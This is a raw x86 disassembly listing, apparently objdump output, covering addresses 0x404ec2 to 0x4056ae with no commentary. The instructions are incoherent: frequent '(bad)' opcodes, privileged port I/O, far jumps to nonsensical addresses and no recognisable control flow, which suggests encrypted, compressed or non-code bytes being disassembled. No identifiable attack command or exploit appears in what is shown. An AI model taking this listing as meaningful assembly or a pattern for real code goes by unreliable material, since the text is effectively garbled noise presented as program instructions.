  404ec2:	pop    edi
  404ec3:	pusha  
  404ec4:	mov    dh,0xa5
  404ec6:	push   edi
  404ec7:	xchg   DWORD PTR [edi],esi
  404ec9:	sub    ebx,esi
  404ecb:	inc    edi
  404ecc:	mov    ebx,0xcfe6c66f
  404ed1:	push   ebx
  404ed2:	(bad)  
  404ed3:	clc    
  404ed4:	loopne 0x404f3b
  404ed6:	(bad)  
  404ed7:	cmp    ebp,esp
  404ed9:	adc    dl,cl
  404edb:	mov    DWORD PTR [ebx],ebp
  404edd:	mov    ebp,0xbffa6a66
  404ee2:	lods   eax,DWORD PTR ds:[esi]
  404ee3:	inc    ebp
  404ee5:	mov    WORD PTR ds:0x5a0678b4,fs
  404eeb:	push   ebp
  404eec:	mov    dl,0x89
  404eee:	xsavec [esi+0xc]
  404ef2:	sbb    BYTE PTR [ebx-0x5be14cb7],al
  404ef8:	and    al,0x7d
  404efa:	and    al,0x49
  404efc:	mov    ecx,0xfbe3f9c8
  404f01:	jmp    0xf041785a
  404f06:	into   
  404f07:	fadd   QWORD PTR [ebx-0x40]
  404f0a:	std    
  404f0b:	mov    bh,0xdb
  404f0d:	or     eax,0x56775d82
  404f12:	out    dx,eax
  404f13:	push   ss
  404f14:	js     0x404f63
  404f16:	retf   0x41d3
  404f19:	leave  
  404f1a:	cdq    
  404f1b:	cmp    al,0x23
  404f1d:	and    eax,0xf788cca5
  404f22:	xor    al,BYTE PTR [esp+ebp*8-0x4b2963e1]
  404f29:	gs repnz push esi
  404f2c:	stc    
  404f2d:	mov    bh,0x1d
  404f2f:	xor    DWORD PTR [ebx+0x6557ac53],eax
  404f35:	nop
  404f36:	dec    ebp
  404f37:	fsubr  DWORD PTR [edi+esi*2-0x4d096b40]
  404f3e:	jmp    0xa6ce:0xc564242e
  404f45:	js     0x404efd
  404f47:	mov    DWORD PTR [ebp-0x58],ecx
  404f4a:	outs   dx,BYTE PTR ds:[esi]
  404f4b:	mov    WORD PTR [si-0x46],ss
  404f4f:	ds push 0x6c970274
  404f55:	pop    ecx
  404f56:	pop    ecx
  404f57:	int    0x36
  404f59:	(bad)
  404f5c:	sub    DWORD PTR [esi+0x6103a244],esp
  404f62:	fxch   st(1)
  404f64:	cmc    
  404f65:	fcmovnu st,st(0)
  404f67:	ins    DWORD PTR es:[edi],dx
  404f68:	xor    eax,0xf8ae9d64
  404f6d:	jg     0x404efd
  404f6f:	xchg   ebx,eax
  404f70:	xor    al,0x7b
  404f72:	lea    esp,cs:[ecx-0x5c]
  404f76:	lahf   
  404f77:	pop    DWORD PTR [esi+0x120eaf1a]
  404f7d:	push   ebp
  404f7e:	xchg   ebx,eax
  404f7f:	xor    DWORD PTR [eax-0x3e],0xffffffaf
  404f83:	cld    
  404f84:	mov    esp,0x3b88f242
  404f89:	sar    edx,cl
  404f8b:	daa    
  404f8c:	rcl    BYTE PTR [esi],cl
  404f8e:	cmp    BYTE PTR [eax+0x536f1156],bl
  404f94:	or     eax,0x43d154a6
  404f99:	pop    ss
  404f9a:	or     al,0x5f
  404f9c:	sub    bh,BYTE PTR [ebx+0x6e]
  404f9f:	bound  esi,QWORD PTR [ecx+0x390afab8]
  404fa5:	push   eax
  404fa6:	push   edx
  404fa7:	cmp    DWORD PTR [eax],ebx
  404fa9:	ins    BYTE PTR es:[edi],dx
  404faa:	dec    ecx
  404fab:	add    al,0x6e
  404fad:	lahf   
  404fae:	iret   
  404faf:	sub    al,bl
  404fb1:	push   0xffffffa4
  404fb3:	cmc    
  404fb4:	fwait
  404fb5:	xchg   edx,eax
  404fb6:	and    ecx,eax
  404fb8:	test   BYTE PTR [ecx+0x77],0xae
  404fbc:	lods   eax,DWORD PTR ds:[esi]
  404fbd:	mov    al,0x6d
  404fbf:	adc    eax,0x79e89466
  404fc4:	leave  
  404fc5:	jmp    0x405040
  404fc7:	(bad)  
  404fc8:	shr    DWORD PTR [edi],1
  404fca:	mov    edx,0x96d4fb86
  404fcf:	xchg   esi,eax
  404fd0:	add    DWORD PTR [esi-0x4c3345b],edi
  404fd6:	enter  0x6b4f,0x3a
  404fda:	push   ecx
  404fdb:	ret    0x10a9
  404fde:	push   ebp
  404fdf:	les    ebp,FWORD PTR [ecx-0x76]
  404fe2:	and    al,BYTE PTR [ebp+0x2aa02a80]
  404fe8:	sbb    bh,BYTE PTR [esi+0x23752d3b]
  404fee:	cli    
  404fef:	push   ebp
  404ff0:	jo     0x405024
  404ff2:	push   edi
  404ff3:	pop    ebx
  404ff4:	imul   edx,DWORD PTR [eax+0x5454d092],0xffffff89
  404ffb:	xor    bh,ah
  404ffd:	mov    WORD PTR ds:0x964f8a73,es
  405003:	push   edx
  405004:	data16 xor bh,cl
  405007:	jae    0x405008
  405009:	sub    DWORD PTR [ebx],esp
  40500b:	cmc    
  40500c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40500d:	jne    0x40506b
  40500f:	out    0xe6,al
  405011:	loope  0x40504d
  405013:	sub    ecx,ebx
  405015:	(bad)  
  405016:	in     eax,dx
  405017:	or     BYTE PTR [ebp+0x2f],dh
  40501a:	int3   
  40501b:	sbb    DWORD PTR [esi-0x7e],0x3a
  40501f:	mov    ebp,0x3322259a
  405024:	cmp    al,0xe5
  405026:	and    eax,0xb842fa25
  40502b:	in     al,dx
  40502c:	pop    eax
  40502d:	push   ebx
  40502e:	test   BYTE PTR [ebp+0x264514a1],bh
  405034:	push   ebx
  405035:	test   BYTE PTR [esi],0xf
  405038:	rcl    DWORD PTR [esi+0x73],0xd7
  40503c:	neg    ebp
  40503e:	mov    ebp,0x2ac52d87
  405043:	(bad)  
  405044:	push   cs
  405045:	push   edx
  405046:	pop    ss
  405047:	and    ecx,DWORD PTR [edx]
  405049:	xchg   esp,eax
  40504a:	cmp    edx,DWORD PTR [ebx-0x1409182d]
  405050:	mov    ds:0xf5bbe7b,eax
  405055:	scas   eax,DWORD PTR es:[edi]
  405056:	cmc    
  405057:	fadd   QWORD PTR [ebx-0x73b9ea3]
  40505d:	pop    ds
  40505e:	add    BYTE PTR [ebx-0xaec9ef1],dl
  405064:	loope  0x4050c7
  405066:	jb     0x405081
  405068:	ja     0x405054
  40506a:	clc    
  40506b:	sub    al,0xe8
  40506d:	aaa    
  40506e:	idiv   DWORD PTR [eax-0x5a6c6c0e]
  405074:	mov    ?,ebp
  405076:	loopne 0x40509c
  405078:	mov    bl,0x56
  40507a:	pop    esi
  40507b:	(bad)  
  40507d:	jno    0x405012
  40507f:	clc    
  405080:	in     al,0x7
  405082:	(bad)  
  405083:	(bad)  
  405085:	jg     0x4050e5
  405087:	sub    dl,ch
  405089:	aas    
  40508a:	xor    al,0x65
  40508c:	std    
  40508d:	(bad)  
  40508e:	jecxz  0x40505f
  405090:	mov    bh,0x93
  405092:	jp     0x40508b
  405094:	fldenv [esi-0x77]
  405097:	push   es
  405098:	mov    ds:0x6b5d7449,eax
  40509d:	sbb    ecx,DWORD PTR [ebx-0x10]
  4050a0:	push   edx
  4050a1:	jnp    0x405096
  4050a3:	sub    DWORD PTR [edx],edi
  4050a5:	jmp    0x405094
  4050a7:	add    edx,DWORD PTR [edi+edi*8-0x24e417b6]
  4050ae:	ret    
  4050af:	popa   
  4050b0:	out    0xb1,eax
  4050b2:	outs   dx,BYTE PTR ds:[esi]
  4050b3:	pusha  
  4050b4:	stos   BYTE PTR es:[edi],al
  4050b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050b6:	add    BYTE PTR [ebp+0x4d],ch
  4050b9:	inc    esi
  4050ba:	fdiv   st,st(0)
  4050bc:	jp     0x405113
  4050be:	add    eax,0xf7043786
  4050c3:	sbb    ch,BYTE PTR [ebp+0x56]
  4050c6:	xor    al,0xc9
  4050c8:	mov    bl,0xcd
  4050ca:	ss or  edx,ebx
  4050cd:	adc    eax,DWORD PTR [eax+0x303131e0]
  4050d3:	push   ebp
  4050d4:	mov    BYTE PTR ss:[ecx-0x47],ah
  4050d8:	push   ss
  4050d9:	in     eax,0xf1
  4050db:	scas   al,BYTE PTR es:[edi]
  4050dc:	xor    DWORD PTR [ebp-0x27],eax
  4050df:	in     eax,dx
  4050e0:	pop    ecx
  4050e1:	xchg   esi,eax
  4050e2:	mov    ecx,0xf77a006a
  4050e7:	add    bl,BYTE PTR [eax]
  4050e9:	and    al,0x9f
  4050eb:	mov    ebx,0xdf8047c7
  4050f0:	shl    DWORD PTR [edi],1
  4050f2:	xor    ah,BYTE PTR [ecx+0x3d0cb098]
  4050f8:	jae    0x405150
  4050fa:	and    BYTE PTR [eax],cl
  4050fc:	push   eax
  4050fd:	std    
  4050fe:	jmp    0xef3fdd45
  405103:	xchg   DWORD PTR [ebp+edx*8-0x78571a9c],edi
  40510a:	dec    ebp
  40510b:	xchg   bl,ch
  40510d:	pop    ebp
  40510e:	cs in  ax,0xde
  405112:	mov    ch,0xe0
  405114:	test   DWORD PTR [esi+0x7e3b3d1a],ebp
  40511a:	xchg   ebx,eax
  40511b:	add    BYTE PTR ds:[ecx-0x5498678c],bh
  405122:	shr    BYTE PTR [edx+0x5d3ec37a],0xa7
  405129:	xchg   edi,eax
  40512a:	into   
  40512b:	push   ebp
  40512c:	mov    ch,0xca
  40512e:	mov    al,ds:0x6528f881
  405133:	xor    eax,DWORD PTR [edi-0x13]
  405136:	push   ds
  405137:	adc    BYTE PTR [edx],al
  405139:	add    DWORD PTR [edx+eiz*1],edx
  40513c:	mov    esp,0x9b87e4ff
  405141:	arpl   sp,si
  405143:	cmp    eax,0x4385b8c7
  405148:	(bad)  
  405149:	scas   al,BYTE PTR es:[edi]
  40514a:	ror    BYTE PTR [ecx-0x33],1
  40514d:	xchg   ebx,eax
  40514e:	sub    BYTE PTR [edi+0x56],cl
  405151:	outs   dx,DWORD PTR ds:[esi]
  405152:	daa    
  405153:	jnp    0x40515a
  405155:	jnp    0x4050e1
  405157:	(bad)  
  405158:	mov    ebx,0xcf40afdc
  40515d:	call   0x3b97:0xb2e5068f
  405164:	mov    cl,0xdb
  405166:	add    eax,eax
  405168:	mov    al,cl
  40516a:	xor    DWORD PTR ds:0x3aea1d91,esi
  405170:	(bad)  
  405171:	inc    ax
  405173:	(bad)  
  405174:	(bad)  
  405175:	mov    ebp,0xc9b4a245
  40517a:	mov    ch,0xcf
  40517c:	iret   
  40517d:	xchg   edi,eax
  40517e:	add    ebx,esi
  405180:	add    bl,BYTE PTR gs:[esi+edx*8-0xcf683ff]
  405188:	push   edi
  405189:	mov    esi,fs
  40518b:	scas   eax,DWORD PTR es:[edi]
  40518c:	dec    esp
  40518d:	cmc    
  40518e:	fwait
  40518f:	icebp  
  405190:	adc    DWORD PTR [edx+0x35],edx
  405193:	repz push esi
  405195:	add    bh,BYTE PTR [esi-0x6b9ce51b]
  40519b:	cs add eax,0x47ae6db4
  4051a1:	aas    
  4051a2:	push   ss
  4051a3:	lods   al,BYTE PTR es:[esi]
  4051a5:	push   ss
  4051a6:	ret    
  4051a7:	mov    eax,ds:0x203efc6a
  4051ac:	rcr    DWORD PTR [esp+eax*8+0x1f15417b],1
  4051b3:	jmp    0x405163
  4051b5:	cmp    DWORD PTR [esi+0x13],edi
  4051b8:	icebp  
  4051b9:	push   0x307ff1af
  4051be:	cmp    DWORD PTR [ecx+0x47],eax
  4051c1:	xchg   edi,eax
  4051c2:	xchg   ecx,eax
  4051c3:	imul   esp,esp,0x6d
  4051c6:	outs   dx,BYTE PTR ds:[esi]
  4051c7:	cld    
  4051c8:	and    dl,dl
  4051ca:	push   cs
  4051cb:	fimul  WORD PTR [edx-0x40a12a6]
  4051d1:	js     0x4051e2
  4051d3:	mov    eax,ds:0x53d78188
  4051d8:	mov    ebp,0x29a0ae6b
  4051dd:	adc    esp,0xffffffd9
  4051e0:	xor    eax,0x5734e11b
  4051e5:	mov    bl,BYTE PTR [esp+edx*8]
  4051e8:	pop    edi
  4051e9:	daa    
  4051ea:	lds    eax,FWORD PTR [edx+0x5b]
  4051ed:	jge    0x4051bf
  4051ef:	inc    edx
  4051f0:	retf   
  4051f1:	or     dh,bh
  4051f3:	and    bl,BYTE PTR [ebx-0x26]
  4051f6:	call   0x6321daa
  4051fb:	xchg   esp,eax
  4051fc:	adc    cl,BYTE PTR [esp+ebx*4-0x4fde7aef]
  405203:	and    al,0x7b
  405205:	ret    
  405206:	xlat   BYTE PTR ds:[ebx]
  405207:	inc    ecx
  405208:	outs   dx,DWORD PTR ds:[esi]
  405209:	sbb    eax,DWORD PTR [esp+eax*1]
  40520c:	(bad)  
  40520d:	and    eax,0xf198317c
  405212:	mov    edi,0x5164f0c2
  405217:	(bad)  
  405218:	sti    
  405219:	scas   al,BYTE PTR es:[edi]
  40521a:	push   ebx
  40521b:	xor    al,0xcc
  40521d:	inc    esp
  40521e:	call   0x2efb:0xfa42776d
  405225:	jmp    0xbdd6:0x84f468f4
  40522c:	addr16 and al,0x2d
  40522f:	rcr    al,cl
  405231:	jns    0x405282
  405233:	pop    ebp
  405234:	fisubr DWORD PTR [eax]
  405236:	add    DWORD PTR [edx-0x494b34ac],esi
  40523c:	add    DWORD PTR [edx-0x1e754afa],ebp
  405242:	jg     0x405275
  405244:	sub    ch,bl
  405246:	xor    dl,BYTE PTR fs:[ebx]
  405249:	jg     0x40523c
  40524b:	xor    edx,DWORD PTR [ebx-0x4d]
  40524e:	iret   
  40524f:	jno    0x405276
  405251:	test   BYTE PTR [esi+0x77],0xfb
  405255:	not    DWORD PTR [eax]
  405257:	je     0x4051ec
  405259:	loope  0x405207
  40525b:	les    ecx,FWORD PTR [edx+0x3b]
  40525e:	fldcw  WORD PTR ds:0x3fd2da20
  405264:	dec    eax
  405265:	fstp   TBYTE PTR [edx]
  405267:	adc    ebp,DWORD PTR [edi-0x7eadb0f6]
  40526d:	test   BYTE PTR [ebx+ecx*1],bh
  405270:	nop
  405271:	pushf  
  405272:	push   0xfd63feaf
  405277:	jbe    0x405221
  405279:	sub    BYTE PTR [ecx+ebp*8+0x44],dh
  40527d:	cli    
  40527e:	ss push ebx
  405280:	cmp    BYTE PTR [edi-0x18],0x36
  405284:	xor    BYTE PTR [esi+edi*4-0x48],bh
  405288:	in     al,dx
  405289:	iret   
  40528a:	lods   eax,DWORD PTR ds:[esi]
  40528b:	sbb    al,0x85
  40528d:	sub    al,BYTE PTR [edi+0x38]
  405290:	jno    0x4052f6
  405292:	not    ah
  405294:	repz mov ebx,0x83bf7c6a
  40529a:	and    eax,0x345ff08e
  40529f:	lds    esp,FWORD PTR [ebx-0x2646667]
  4052a5:	jae    0x40527a
  4052a7:	(bad)  
  4052a8:	mov    al,BYTE PTR [eax+0x5007063]
  4052ae:	fsubr  DWORD PTR [edi+0x6a54edb7]
  4052b4:	jo     0x405291
  4052b6:	daa    
  4052b7:	aam    0x38
  4052b9:	adc    BYTE PTR [ecx],0x55
  4052bc:	mov    eax,ds:0xb2703c23
  4052c1:	mov    al,0xd8
  4052c3:	dec    esi
  4052c4:	(bad)  
  4052c5:	popa   
  4052c6:	retf   0xa16f
  4052c9:	test   eax,0x87606564
  4052ce:	mov    cl,cl
  4052d0:	(bad)  [esi+edi*2]
  4052d3:	sbb    BYTE PTR es:[edi-0x3f],ah
  4052d7:	pop    eax
  4052d8:	xchg   ebp,eax
  4052d9:	add    dl,BYTE PTR [ecx+0x57]
  4052dc:	inc    esp
  4052dd:	cdq    
  4052de:	mov    ebx,0xc5916bff
  4052e3:	pop    esi
  4052e4:	aas    
  4052e5:	mov    eax,0x3e78c3b1
  4052ea:	jge    0x4052dd
  4052ec:	and    al,0x7f
  4052ee:	retf   0x52dc
  4052f1:	(bad)  
  4052f2:	dec    esp
  4052f3:	ins    DWORD PTR es:[edi],dx
  4052f4:	gs retf 0x6153
  4052f8:	and    eax,0x5c4560ee
  4052fd:	loope  0x4052a9
  4052ff:	mov    DWORD PTR [esp+eiz*8-0x1b],ecx
  405303:	test   ebx,ebp
  405305:	outs   dx,DWORD PTR ds:[esi]
  405306:	xchg   BYTE PTR [esi-0x7b1d982b],bl
  40530c:	xchg   edx,eax
  40530d:	and    BYTE PTR [ecx-0x3db61e6],0x39
  405314:	mov    ds:0x45c4d81e,al
  405319:	mov    gs,WORD PTR [ecx+0x17757e7]
  40531f:	jl     0x40536b
  405321:	adc    BYTE PTR [ebx],dh
  405323:	ins    BYTE PTR es:[edi],dx
  405324:	xchg   BYTE PTR [edi+0x17139d95],ch
  40532a:	call   0x6409:0xd57269fd
  405331:	mov    edx,0xdb535cdf
  405336:	mov    BYTE PTR [edx],al
  405338:	jns    0x405377
  40533a:	and    bl,BYTE PTR [edx-0x89cea80]
  405340:	mov    eax,0x401a2dfd
  405345:	mov    ebx,0xe7bf7bd4
  40534a:	xchg   esi,eax
  40534b:	sbb    BYTE PTR [ebp+ecx*2+0x8550f44],bh
  405352:	xchg   edi,eax
  405353:	add    BYTE PTR ds:0x43d8771b,0x86
  40535a:	int    0xa5
  40535c:	or     al,0x81
  40535e:	sbb    BYTE PTR [edx],0x6b
  405361:	jge    0x40530b
  405363:	pop    edi
  405364:	into   
  405365:	pop    edi
  405366:	test   esi,esi
  405368:	push   cs
  405369:	pextrw ebx,mm1,0x64
  40536d:	xchg   ebp,eax
  40536e:	xchg   edx,eax
  40536f:	mov    edx,0x725df17b
  405374:	test   esp,eax
  405376:	push   ebp
  405377:	sbb    al,0xe1
  405379:	call   0x6047:0xb1894ba0
  405380:	and    BYTE PTR [esi+0x37],bh
  405383:	sbb    eax,0x3fe5714d
  405388:	test   al,0xbd
  40538a:	jg     0x4053fa
  40538c:	jge    0x40535c
  40538e:	push   esi
  40538f:	cwde   
  405390:	push   cs
  405391:	inc    esi
  405392:	xor    eax,0xcf799ac8
  405397:	cwde   
  405398:	nop
  405399:	sahf   
  40539a:	mov    eax,ds:0x33050827
  40539f:	mov    ebp,0x1a18d359
  4053a4:	xchg   ebp,eax
  4053a5:	mov    edi,0x2832cc59
  4053aa:	add    BYTE PTR [ecx-0x79e89b94],bh
  4053b0:	stc    
  4053b1:	inc    esi
  4053b2:	aad    0x1b
  4053b4:	mov    bl,0xdc
  4053b6:	std    
  4053b7:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053b9:	sub    BYTE PTR [ecx],ch
  4053bb:	add    al,0xc0
  4053bd:	mov    al,0x9f
  4053bf:	cmp    ebx,0xffffffbb
  4053c2:	sub    BYTE PTR [esi],0xde
  4053c5:	sbb    DWORD PTR [edx+0x1b],ebp
  4053c8:	inc    esi
  4053c9:	loope  0x4053fb
  4053cb:	(bad)  
  4053cc:	mov    ds:0x3636ad0c,eax
  4053d1:	sti    
  4053d2:	sbb    eax,0x19050594
  4053d7:	jp     0x405391
  4053d9:	cmc    
  4053da:	push   ss
  4053db:	sub    BYTE PTR [edi],cl
  4053dd:	into   
  4053de:	mov    bh,0xee
  4053e0:	nop
  4053e1:	pop    eax
  4053e2:	adc    ebx,ecx
  4053e4:	sub    ah,ch
  4053e6:	inc    edi
  4053e7:	sbb    ebp,DWORD PTR [esi-0x6d]
  4053ea:	ja     0x405434
  4053ec:	in     eax,0x79
  4053ee:	mov    esi,0x8433f2e0
  4053f3:	sbb    esi,DWORD PTR [ecx+0x6e]
  4053f6:	push   cs
  4053f7:	fwait
  4053f8:	pop    ss
  4053f9:	xchg   ecx,eax
  4053fa:	mov    edi,0xa287cef8
  4053ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405400:	adc    eax,0x3065e0d6
  405405:	push   0xffffff8c
  405407:	addr16 mov eax,0x6426c84b
  40540d:	pop    edi
  40540e:	or     BYTE PTR [ebp+0x33],cl
  405411:	adc    cl,ch
  405413:	xchg   edi,eax
  405414:	fidivr DWORD PTR [ecx-0x400b4fe]
  40541a:	cmp    BYTE PTR [ebp-0x12],al
  40541d:	ret    
  40541e:	jnp    0x40547c
  405420:	add    cl,BYTE PTR [esi-0x7901e13c]
  405426:	int    0xb8
  405428:	and    al,0xcd
  40542a:	add    al,0xe8
  40542c:	(bad)  
  40542d:	adc    cl,ch
  40542f:	fld    QWORD PTR [ecx+0x5b30f5b1]
  405435:	mov    cl,0x83
  405437:	and    al,0x22
  405439:	loopne 0x405498
  40543b:	mov    ds:0xee58cfde,eax
  405440:	pop    es
  405441:	adc    edx,DWORD PTR [ebp+eax*1+0x4fea6dab]
  405448:	xor    edx,DWORD PTR [ecx+ecx*8]
  40544b:	mov    ebp,0x84b54507
  405450:	fldln2 
  405452:	fisttp WORD PTR [edi-0x1c78b663]
  405458:	outs   dx,BYTE PTR ds:[esi]
  405459:	int    0x6a
  40545b:	lea    ebp,[edx+0xb58a10f]
  405461:	push   0x9fcefbc9
  405466:	stc    
  405467:	xor    al,0x30
  405469:	fadd   st,st(5)
  40546b:	jns    0x4054a3
  40546d:	and    dl,BYTE PTR [edx+0x1b9b8da4]
  405473:	mov    edx,0x37ee00a6
  405478:	pop    ecx
  405479:	jmp    0x405427
  40547b:	dec    esp
  40547c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40547d:	sahf   
  40547e:	daa    
  40547f:	sbb    al,0xf9
  405481:	pop    ss
  405482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405483:	bt     DWORD PTR [ebx+eax*1-0x7086ae70],ecx
  40548b:	cli    
  40548c:	outs   dx,DWORD PTR ds:[esi]
  40548d:	int3   
  40548e:	jbe    0x4054a2
  405490:	push   ds
  405491:	lahf   
  405492:	adc    BYTE PTR [ebx+0x73],0x91
  405496:	and    BYTE PTR [esi],cl
  405498:	inc    ebx
  405499:	push   edx
  40549a:	mov    ah,0xa1
  40549c:	xchg   BYTE PTR ds:0xc6d5495f,cl
  4054a2:	mov    edx,0x911d5cd5
  4054a7:	cs jg  0x4054d9
  4054aa:	xchg   ebp,eax
  4054ab:	mov    dl,BYTE PTR [ecx-0x23bf5b2b]
  4054b1:	jecxz  0x405479
  4054b3:	jne    0x4054d8
  4054b5:	xor    al,0xcb
  4054b7:	pop    edx
  4054b8:	add    ebx,DWORD PTR [ebx-0x7e]
  4054bb:	ja     0x405491
  4054bd:	sub    edx,DWORD PTR [edx]
  4054bf:	out    0x36,al
  4054c1:	xchg   DWORD PTR [ecx],ecx
  4054c3:	mov    cl,0xf
  4054c5:	add    eax,0xdd80a5b1
  4054ca:	(bad)  
  4054cb:	jmp    0x1779dfad
  4054d0:	int    0x1c
  4054d2:	icebp  
  4054d3:	push   ds
  4054d4:	jne    0x40551e
  4054d6:	int3   
  4054d7:	pop    edx
  4054d8:	leave  
  4054d9:	iret   
  4054da:	lods   eax,DWORD PTR ds:[esi]
  4054db:	push   ds
  4054dc:	push   edi
  4054dd:	mov    cl,0x58
  4054df:	test   BYTE PTR [edi+edx*8],al
  4054e2:	(bad)  
  4054e3:	and    bl,BYTE PTR [esi+0x455b02a8]
  4054e9:	stos   DWORD PTR es:[edi],eax
  4054ea:	and    BYTE PTR [ecx-0x68],0x90
  4054ee:	jmp    0xae69:0xc0970797
  4054f5:	push   0xffffff93
  4054f7:	inc    edx
  4054f8:	mov    esi,0x70095165
  4054fd:	cmp    al,0x35
  4054ff:	sar    ah,0xc0
  405502:	imul   edi,DWORD PTR ds:0x5d39acc4,0xde206be2
  40550c:	scas   eax,DWORD PTR es:[edi]
  40550d:	xlat   BYTE PTR ds:[ebx]
  40550e:	inc    ecx
  40550f:	enter  0xda55,0xf9
  405513:	inc    esi
  405514:	inc    edx
  405515:	cs mov ah,0x12
  405518:	push   ebp
  405519:	mov    ch,0x68
  40551b:	add    al,ah
  40551d:	push   0x8ef44ae3
  405522:	add    al,0xd6
  405524:	xchg   edx,eax
  405525:	jmp    0xc6a7:0xb9ef1ee0
  40552c:	ja     0x405523
  40552e:	cdq    
  40552f:	adc    al,0x84
  405531:	pop    ebx
  405532:	mov    al,ds:0x623338ef
  405537:	dec    edx
  405538:	cmp    edi,DWORD PTR [edi+0x7e]
  40553b:	jo     0x405585
  40553d:	jp     0x40554d
  40553f:	test   BYTE PTR [edx+esi*4],0x4
  405543:	in     al,dx
  405544:	pop    ebx
  405545:	outs   dx,DWORD PTR ds:[esi]
  405546:	iret   
  405547:	jno    0x40551d
  405549:	mov    ds:0x11df82a9,al
  40554e:	fsub   st(4),st
  405550:	jb     0x405513
  405552:	sbb    dh,BYTE PTR [esp+edx*2]
  405555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405556:	pop    eax
  405557:	and    ah,BYTE PTR [edx+0x32e44543]
  40555d:	in     eax,dx
  40555e:	pop    esi
  40555f:	or     BYTE PTR [edx],dh
  405561:	shr    DWORD PTR ds:0x27f8508f,0xdc
  405568:	call   0x4b43:0xadec989e
  40556f:	lods   al,BYTE PTR ds:[esi]
  405570:	cmp    al,0x5b
  405572:	jbe    0xb2973407
  405578:	out    dx,al
  405579:	(bad)  
  40557b:	mov    ebp,0xf41d93fd
  405580:	xchg   esi,eax
  405581:	outs   dx,BYTE PTR ds:[esi]
  405582:	cld    
  405583:	cmp    dh,BYTE PTR [edx+0x3c3f8eb9]
  405589:	pop    edi
  40558a:	push   esp
  40558b:	setl   BYTE PTR [ebp+0x4]
  40558f:	dec    eax
  405590:	fdiv   DWORD PTR [edi-0x6b0f33a3]
  405596:	inc    DWORD PTR [ebp-0x4f9ac779]
  40559c:	mov    ds:0x990c56a9,al
  4055a1:	ret    
  4055a2:	inc    eax
  4055a3:	pop    eax
  4055a4:	jns    0x405565
  4055a6:	dec    edx
  4055a7:	sar    BYTE PTR [ebx-0x6a143b20],cl
  4055ad:	and    al,0x6c
  4055af:	out    0x82,al
  4055b1:	jbe    0x40554a
  4055b3:	jl     0x40561a
  4055b5:	stc    
  4055b6:	repnz pusha 
  4055b8:	mov    esi,0xc7dea89a
  4055bd:	ins    BYTE PTR es:[edi],dx
  4055be:	jg     0x4055d7
  4055c0:	scas   al,BYTE PTR es:[edi]
  4055c1:	enter  0xd7b,0x53
  4055c5:	fwait
  4055c6:	push   esi
  4055c7:	and    BYTE PTR [ecx+edi*8],bl
  4055ca:	cmp    ah,BYTE PTR [esi+0x4fee2c3a]
  4055d0:	dec    ecx
  4055d1:	pop    ebx
  4055d2:	loopne 0x4055b6
  4055d4:	push   edi
  4055d5:	jo     0x4055a9
  4055d7:	pop    ss
  4055d8:	or     DWORD PTR [ebx],edi
  4055da:	sub    edx,DWORD PTR [edx-0x589be6d9]
  4055e0:	cmp    DWORD PTR [ebx-0x48],esp
  4055e3:	std    
  4055e4:	pop    edx
  4055e5:	xor    esi,eax
  4055e7:	std    
  4055e8:	jmp    0x405575
  4055ea:	(bad)  
  4055eb:	mov    cl,0x28
  4055ed:	in     al,dx
  4055ee:	or     al,BYTE PTR [esi+0x25]
  4055f1:	pop    es
  4055f2:	mov    ds:0x35285a3d,eax
  4055f7:	xor    DWORD PTR [ebp-0x1e2b315d],ecx
  4055fd:	shr    BYTE PTR [edi+eiz*4],1
  405600:	sub    al,0xcb
  405602:	test   BYTE PTR [edi],0xdc
  405605:	mov    esi,0xff75aa9b
  40560a:	arpl   WORD PTR [esi],bp
  40560c:	stos   DWORD PTR es:[edi],eax
  40560d:	es stos DWORD PTR es:[edi],eax
  40560f:	call   0x3ea8:0x53b8d08e
  405616:	pop    edi
  405617:	ret    0xfafb
  40561a:	add    bl,BYTE PTR [edi]
  40561c:	jge    0x405659
  40561e:	std    
  40561f:	push   edi
  405620:	sbb    DWORD PTR [ecx+0x10],ecx
  405623:	inc    esi
  405624:	mov    dh,0x91
  405626:	push   esp
  405627:	xchg   ebx,eax
  405628:	stos   BYTE PTR es:[edi],al
  405629:	out    0x88,al
  40562b:	fmul   DWORD PTR [ebp+0x6a]
  40562e:	xlat   BYTE PTR ds:[ebx]
  40562f:	fwait
  405630:	dec    ebp
  405631:	arpl   WORD PTR [edi],bp
  405633:	inc    eax
  405634:	pop    edi
  405635:	in     eax,dx
  405636:	jnp    0x4056ac
  405638:	jmp    0x5f317c1c
  40563d:	out    dx,al
  40563e:	push   esi
  40563f:	lahf   
  405640:	je     0x40565c
  405642:	dec    DWORD PTR [ecx+0x28]
  405645:	cmp    al,0x58
  405647:	ret    
  405648:	rcr    al,cl
  40564a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40564b:	push   edi
  40564c:	pop    edx
  40564d:	gs dec eax
  40564f:	or     bl,0xc0
  405652:	xlat   BYTE PTR ds:[ebx]
  405653:	fcmovnb st,st(4)
  405655:	cmp    ah,BYTE PTR [eax-0x44b513ce]
  40565b:	rcl    DWORD PTR [edi],cl
  40565d:	dec    ebp
  40565e:	test   al,0x51
  405660:	cmp    BYTE PTR [esi],al
  405662:	test   BYTE PTR [edx-0x1142787d],0x71
  405669:	push   ecx
  40566a:	sub    eax,0xbafa5303
  40566f:	push   ebx
  405670:	mov    ds:0x604c1ffb,al
  405675:	scas   al,BYTE PTR es:[edi]
  405676:	adc    BYTE PTR [esi+0x3fa1458a],al
  40567c:	fistp  QWORD PTR [ecx+0xe7364b1]
  405682:	pusha  
  405683:	dec    edi
  405684:	clc    
  405685:	xchg   ebp,eax
  405686:	add    eax,0x167384ff
  40568b:	popf   
  40568c:	pop    eax
  40568d:	cwde   
  40568e:	cs out 0x8f,eax
  405691:	adc    al,0x13
  405693:	jmp    0x405706
  405695:	mov    bl,0xdf
  405697:	adc    dh,BYTE PTR [edx]
  405699:	loop   0x405650
  40569b:	inc    ecx
  40569c:	fsub   st(4),st
  40569e:	inc    edx
  40569f:	jge    0x40565a
  4056a1:	shl    esi,1
  4056a3:	out    0xc9,al
  4056a5:	inc    edx
  4056a6:	xchg   DWORD PTR [ecx+esi*8-0x42],edi
  4056aa:	addr16 gs (bad) 
  4056ae:	mov    al,0x60
